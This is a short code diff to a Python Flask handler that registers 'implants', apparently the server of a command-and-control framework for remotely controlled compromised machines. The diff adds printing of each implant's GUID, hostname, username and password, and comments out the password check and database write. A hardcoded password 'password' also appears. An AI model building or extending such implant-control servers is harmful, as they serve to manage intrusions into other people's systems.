@@ -15,16 +15,21 @@ password = "password"
 def handle_register():
     print(f'REGISTERING A NEW IMPLANT')
     register = RegisterImplant()
-    print('klsdjflksd')
     reg_data = request.get_data()
     print(reg_data)
     register.ParseFromString(reg_data)
-    print("please work")
+    print(register.GUID)
+    print(register.Hostname)
+    print(register.Username)
+    print(register.Password)
+    '''
     if register.Password != password:
         abort(404)
+    
     r = make_implant(register)
     db.session.add(r)
     db.commit()
+    '''
     print("Watch out sexy ;) a New Implant connected!")
     return "Success\n."
 
